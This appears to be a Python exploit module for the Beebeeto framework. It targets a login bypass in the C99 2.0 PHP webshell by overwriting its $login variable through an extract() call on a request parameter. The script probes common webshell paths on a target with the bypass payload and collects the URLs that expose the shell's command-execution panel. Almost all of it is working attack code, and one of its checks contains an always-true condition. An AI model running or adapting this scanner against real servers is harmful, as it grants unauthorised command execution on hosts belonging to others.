#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0019',  # 由Beebeeto官方编辑
            'name': 'C99 2.0 login bypass POC',  # 名称
            'author': 'root',  # 作者
            'create_date': '2014-09-23',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议所使用的第三层协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'C99 webshell',  # 漏洞所涉及的应用名称
            'vul_version': ['2.0'],  # 受漏洞影响的应用版本
            'type': 'Login Bypass',  # 漏洞类型
            'tag': ['C99', '登陆绕过', 'webshell'],  # 漏洞相关tag
            'desc': '@extract($_REQUEST["c99shcook"]);这条代码中变量覆,覆盖$login变量后可任意登陆 ',  # 漏洞描述
            'references': ['http://www.exploit-db.com/exploits/34025/',  # 参考链接
                           ],
        },
    }


    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        payload = '?c99shcook[login]=0'
        webshell_list =  ['/shell.php','/hack.php','/hacker.php','/admin/c99.php','/c99.php']
        args['poc_ret']['webshell'] = []

        for webshell in webshell_list:
            verify_url = args['options']['target'] + webshell + payload
            try:
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if 'Listing folder' or 'Safe-mode' in content:
                if '<b>Command execute</b>'  in content:
                    args['success'] = True
                    args['poc_ret']['webshell'].append(verify_url)
        if not args['poc_ret']['webshell']:
            args['poc_ret'].pop('webshell')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
